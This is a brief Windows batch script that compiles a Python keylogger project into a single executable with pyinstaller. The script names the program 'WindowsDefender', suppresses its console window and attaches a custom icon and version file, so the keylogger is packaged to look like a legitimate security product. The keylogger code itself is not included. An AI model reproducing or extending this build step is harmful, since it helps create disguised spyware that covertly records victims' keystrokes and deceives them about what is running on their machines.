echo off
cd O:\OneDrive - xKx\SoftwareProyect\Python\Keylogger_Python
pyinstaller --clean   --distpath "CompiladoEXE" -F --windowed --icon icon.ico --version-file version.txt WindowsDefender.py
:cmd
pause null 
